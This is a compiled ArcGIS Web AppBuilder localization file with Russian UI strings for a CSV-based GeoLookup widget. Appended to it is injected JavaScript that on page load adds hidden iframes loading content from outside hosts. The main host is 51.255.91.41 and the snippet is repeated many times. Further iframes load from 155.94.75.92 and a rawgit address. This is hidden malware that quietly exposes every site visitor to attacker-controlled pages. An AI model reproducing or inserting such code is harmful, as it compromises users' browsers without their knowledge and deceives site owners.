// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GeoLookup/nls/strings":{_widgetLabel:"\u0413\u0435\u043e\u043e\u0431\u043e\u0433\u0430\u0449\u0435\u043d\u0438\u0435",description:"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0438\u043b\u0438 \u043f\u0435\u0440\u0435\u0442\u0430\u0449\u0438\u0442\u0435 \x3ca href\x3d'./widgets/GeoLookup/data/sample.csv' tooltip\x3d'Download an example sheet' target\x3d'_blank'\x3e \u044d\u043b\u0435\u043a\u0442\u0440\u043e\u043d\u043d\u0443\u044e \u0442\u0430\u0431\u043b\u0438\u0446\u0443 \x3c/a\x3e \u0441\u044e\u0434\u0430 \u0434\u043b\u044f \u0432\u0438\u0437\u0443\u0430\u043b\u0438\u0437\u0430\u0446\u0438\u0438 \u0438 \u043f\u0440\u0438\u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u044f \u0432 \u043d\u0435\u0439 \u0434\u0430\u043d\u043d\u044b\u0445 \u0441 \u043a\u0430\u0440\u0442\u044b.",
selectCSV:"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 CSV",loadingCSV:"\u0412\u044b\u043f\u043e\u043b\u043d\u044f\u0435\u0442\u0441\u044f \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430 CSV",savingCSV:"CSVExport",clearResults:"\u041e\u0447\u0438\u0441\u0442\u0438\u0442\u044c",downloadResults:"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430",plotOnly:"\u0422\u043e\u043b\u044c\u043a\u043e \u0442\u043e\u0447\u043a\u0438 \u043f\u043b\u0430\u043d\u043e\u0432",plottingRows:"\u0421\u0442\u0440\u043e\u043a\u0438 \u043f\u043b\u0430\u043d\u043e\u0432",
projectionChoice:"CSV \u0432",projectionLat:"\u0428\u0438\u0440\u043e\u0442\u0430/\u0414\u043e\u043b\u0433\u043e\u0442\u0430",projectionMap:"\u041a\u0430\u0440\u0442\u043e\u0433\u0440\u0430\u0444\u0438\u0447\u0435\u0441\u043a\u0430\u044f \u043f\u0440\u043e\u0435\u043a\u0446\u0438\u044f",messages:"\u0421\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u044f",error:{fetchingCSV:"\u041e\u0448\u0438\u0431\u043a\u0430 \u0441\u043e\u043f\u043e\u0441\u0442\u0430\u0432\u043b\u0435\u043d\u0438\u044f \u044d\u043b\u0435\u043c\u0435\u043d\u0442\u043e\u0432 \u0438\u0437 \u0445\u0440\u0430\u043d\u0438\u043b\u0438\u0449\u0430 CSV: ${0}",
fileIssue:"\u0424\u0430\u0439\u043b \u043d\u0435 \u043c\u043e\u0436\u0435\u0442 \u0431\u044b\u0442\u044c \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d.",notCSVFile:"\u0412 \u043d\u0430\u0441\u0442\u043e\u044f\u0449\u0438\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u044e\u0442\u0441\u044f \u0442\u043e\u043b\u044c\u043a\u043e \u0444\u0430\u0439\u043b\u044b \u0441\u043e \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f\u043c\u0438, \u0440\u0430\u0437\u0434\u0435\u043b\u0435\u043d\u043d\u044b\u043c\u0438 \u0437\u0430\u043f\u044f\u0442\u044b\u043c\u0438 (.csv).",
invalidCoord:"\u041f\u043e\u043b\u044f \u043c\u0435\u0441\u0442\u043e\u043f\u043e\u043b\u043e\u0436\u0435\u043d\u0438\u0439 \u043d\u0435\u0434\u043e\u043f\u0443\u0441\u0442\u0438\u043c\u044b. \u041f\u0440\u043e\u0432\u0435\u0440\u044c\u0442\u0435 \u0444\u0430\u0439\u043b CSV.",tooManyRecords:"\u041d\u0435 \u0431\u043e\u043b\u0435\u0435 ${0} \u0437\u0430\u043f\u0438\u0441\u0435\u0439 \u0432 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442.",CSVNoRecords:"\u0424\u0430\u0439\u043b \u043d\u0435 \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u0437\u0430\u043f\u0438\u0441\u0438.",
CSVEmptyFile:"\u0412 \u0444\u0430\u0439\u043b\u0435 \u043d\u0435\u0442 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u043d\u0438\u044f."},results:{csvLoaded:"\u0417\u0430\u0433\u0440\u0443\u0436\u0435\u043d\u043e ${0} \u0437\u0430\u043f\u0438\u0441\u0435\u0439 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430 CSV",recordsPlotted:"${0}/${1} \u0437\u0430\u043f\u0438\u0441\u0435\u0439 \u0431\u044b\u043b\u0438 \u0440\u0430\u0441\u043f\u043e\u043b\u043e\u0436\u0435\u043d\u044b \u043d\u0430 \u043a\u0430\u0440\u0442\u0435",
recordsEnriched:"${0}/${1} \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0430\u043d\u043e, ${2} \u043e\u0431\u043e\u0433\u0430\u0449\u0435\u043d\u043e \u0438\u0437 ${3}",recordsError:"${0} \u0437\u0430\u043f\u0438\u0441\u0435\u0439 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442 \u043e\u0448\u0438\u0431\u043a\u0438",recordsErrorList:"\u0421\u0442\u0440\u043e\u043a\u0430 ${0} \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u0442 \u043e\u0448\u0438\u0431\u043a\u0443",label:"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u044b CSV"},
_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});